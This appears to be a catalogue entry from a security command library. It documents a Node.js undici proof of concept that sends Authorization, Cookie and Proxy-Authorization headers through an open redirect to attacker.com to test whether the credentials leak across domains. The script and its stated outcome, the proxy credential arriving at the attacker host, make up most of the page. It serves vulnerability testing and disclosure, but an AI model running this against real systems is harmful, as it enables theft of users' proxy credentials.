---
data: >-
  import { request } from 'undici'

  const {
   statusCode,
   headers,
   body
  } = await
  request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
   maxRedirections: 3,
   headers: {
   "autHorization": 'tes123t',
   "coOkie": "ddd=dddd",
   "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
   'Proxy-Authorization':'xxxxxxxx'
   }
  })


  console.log('response received', statusCode)

  console.log('headers', headers)


  for await (const data of body) {
   console.log('data', data)
  }
tags:
  - exploitation
  - http-request
  - undici
type: command
output: null
executor: node
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.366Z'
id: afffac15-dfe2-4a21-90d7-65a2375013aa
verified: false
validated: true
submitted: true
---
# undici-redirect-test

## Command

```javascript
import { request } from 'undici'
const {
 statusCode,
 headers,
 body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
 maxRedirections: 3,
 headers: {
 "autHorization": 'tes123t',
 "coOkie": "ddd=dddd",
 "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
 'Proxy-Authorization':'xxxxxxxx'
 }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
 console.log('data', data)
}
```

## Description

This Node.js script uses the undici library to send an HTTP request to a redirect endpoint, including sensitive headers like Proxy-Authorization, to test for leakage during cross-domain redirects. It follows up to 3 redirects and logs the response details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Target URL with redirect (e.g., 'http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv') | Yes |
| maxRedirections | Maximum number of redirects to follow (set to 3) | Yes |
| headers.autHorization | Test authorization header (cleared on redirect) | No |
| headers.coOkie | Test cookie header (cleared on redirect) | No |
| headers.X-CSRF-Token | Additional non-sensitive header | No |
| headers.Proxy-Authorization | Sensitive proxy auth header to test leakage | Yes |

## Examples

### Basic Usage

Save as test.js and run `node test.js`.

### Advanced Usage

Modify URL and headers for different targets:

```javascript
// Change to custom proxy creds
const { statusCode, headers, body } = await request('http://custom-redirect.com', { ... });
```

## Expected Output

Console logs show 'response received 200', response headers, and body data. The Proxy-Authorization header is forwarded to the attacker site, confirming leakage.

## Related

- [[procedures/Execute-Undici-Request-with-Proxy-Authorization]]
- [[tools/undici]]
